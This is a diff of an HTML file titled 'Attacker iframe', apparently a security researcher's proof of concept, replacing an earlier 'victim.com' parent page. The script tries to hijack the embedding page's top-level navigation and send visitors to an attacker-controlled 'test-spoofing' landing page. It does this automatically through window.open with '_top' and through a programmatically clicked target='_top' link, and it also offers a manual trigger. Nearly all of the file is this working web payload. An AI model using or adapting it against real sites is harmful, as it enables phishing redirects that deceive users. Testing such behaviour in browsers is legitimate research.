@@ -1,7 +1,60 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>Parent Page - victim.com</h1>
-    <iframe src="https://301f-180-242-214-173.ngrok-free.app/child.html" width="600" height="400"></iframe>
-  </body>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Attacker iframe</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: -apple-system, system-ui, Roboto, Arial; padding: 12px;}
+    .box { border:1px solid #ccc;padding:8px;border-radius:6px;background:#fff; }
+    button { margin-top:8px; }
+  </style>
+</head>
+<body>
+  <h3>Attacker iframe (host origin: <span id="me"></span>)</h3>
+  <div class="box">
+    <p>Variant A: auto <code>window.open(url, '_top')</code> on load (after 2s)</p>
+    <p>Variant B: create <code>&lt;a target="_top"&gt;</code> and click it programmatically (after 6s)</p>
+    <button id="run-manual">Run manual open now</button>
+  </div>
+
+  <script>
+    document.getElementById('me').textContent = location.origin;
+
+    function notifyParent(msg) {
+      try { parent.postMessage(msg, '*'); } catch(e) { /* ignore */ }
+      console.log('[Attacker iframe] ', msg);
+    }
+
+    // Variant A: automatic top-level window.open (after short delay)
+    setTimeout(() => {
+      const url = 'https://syarifmsajjad.github.io/test-spoofing/landing'; // attacker-controlled URL
+      notifyParent('VariantA: about to call window.open -> ' + url);
+      try {
+        // This attempts to navigate top-level
+        window.open(url, '_top');
+      } catch(e) { notifyParent('VariantA error: ' + e); }
+    }, 2000);
+
+    // Variant B: programmatic <a target="_top"> click (after longer delay)
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = 'https://syarifmsajjad.github.io/test-spoofing/landing?via=target_top';
+      a.target = '_top';
+      a.rel = 'noopener noreferrer';
+      a.textContent = 'clicker';
+      document.body.appendChild(a);
+      notifyParent('VariantB: created <a target="_top"> element; triggering click');
+      try {
+        a.click(); // programmatic click
+      } catch(e) { notifyParent('VariantB error: ' + e); }
+    }, 6000);
+
+    // Manual trigger
+    document.getElementById('run-manual').addEventListener('click', () => {
+      notifyParent('Manual trigger: calling window.open');
+      window.open('https://syarifmsajjad.github.io/test-spoofing/landing?manual=1', '_top');
+    });
+  </script>
+</body>
 </html>
